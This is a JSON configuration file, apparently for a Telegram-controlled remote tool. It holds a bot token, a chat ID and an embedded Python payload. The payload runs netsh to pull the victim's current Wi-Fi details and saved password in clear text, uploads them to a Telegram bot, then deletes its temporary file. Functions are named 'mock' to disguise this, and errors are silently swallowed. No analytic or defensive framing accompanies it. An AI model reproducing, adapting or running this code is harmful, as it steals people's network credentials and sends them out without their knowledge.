{"TOKEN": "7626334153:AAFnLe5VnX2tcL5hq2XhekD95oxrjRxbnWE", "CHAT_ID": "6036761167", "COMMANDS": [], "EXECS": ["\nimport os\nimport subprocess\nimport requests\n\ndef get_mock_wifi_info():\n\tresult = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True, encoding='utf-8', errors='replace')\n\treturn result.stdout\n\ndef get_mock_wifi_password(ssid):\n    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], capture_output=True, text=True, encoding='utf-8', errors='replace')\n    return result.stdout\n\ndef send_file(file_path, description=None):\n    # \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430\u043b\u0438\u0447\u0438\u044f \u0444\u0430\u0439\u043b\u0430\n    if not os.path.exists(file_path):\n        return\n\n    url = f\"https://api.telegram.org/bot7626334153:AAFnLe5VnX2tcL5hq2XhekD95oxrjRxbnWE/sendDocument\"\n\n    # \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438\n    try:\n        with open(file_path, 'rb') as file:\n            files = {'document': file}\n\n            # \u0424\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0437\u0430\u043f\u0440\u043e\u0441\u0430\n            data = {'chat_id': 6036761167}\n            if description:\n                data['caption'] = description\n\n            # \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0444\u0430\u0439\u043b\u0430\n            response = requests.post(url, data=data, files=files)\n            response.raise_for_status()  # \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043d\u0430\u043b\u0438\u0447\u0438\u0435 \u043e\u0448\u0438\u0431\u043e\u043a \u0441 HTTP \u043a\u043e\u0434\u043e\u043c\n\n            return response.json()  # \u0412\u043e\u0437\u0432\u0440\u0430\u0442 JSON \u043e\u0442\u0432\u0435\u0442\u0430, \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e\n\n    except requests.exceptions.HTTPError as http_err:\n        pass\n    except Exception as e:\n        pass\n    \nif 1 == 1: # \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u0434\u0440\u0443\u0433\u043e\u0435 \u0438\u043c\u044f, \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u043a\u043e\u043d\u0444\u043b\u0438\u043a\u0442\u043e\u0432\u0430\u0442\u044c\n    wifi_info = get_mock_wifi_info()\n    ssid = None\n    for line in wifi_info.splitlines():\n        if \"SSID\" in line:\n            ssid = line.split(\":\")[1].strip()\n            break\n    \n    if ssid:\n        wifi_info = wifi_info + \"\\n\" + get_mock_wifi_password(ssid)\n    else:\n        wifi_info = wifi_info + \"\\n\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c SSID\"\n\n    # \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0444\u0430\u0439\u043b\n    with open(\"info_mock.txt\", 'w', encoding='utf-8') as f:\n        f.write(wifi_info)\n    \n    send_file(\"info_mock.txt\", \"\u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0430 \u043d\u043e\u0432\u0430\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f!\")\n    \n    # \u0423\u0434\u0430\u043b\u044f\u0435\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0439 \u0444\u0430\u0439\u043b\n    os.remove(\"info_mock.txt\")\n"]}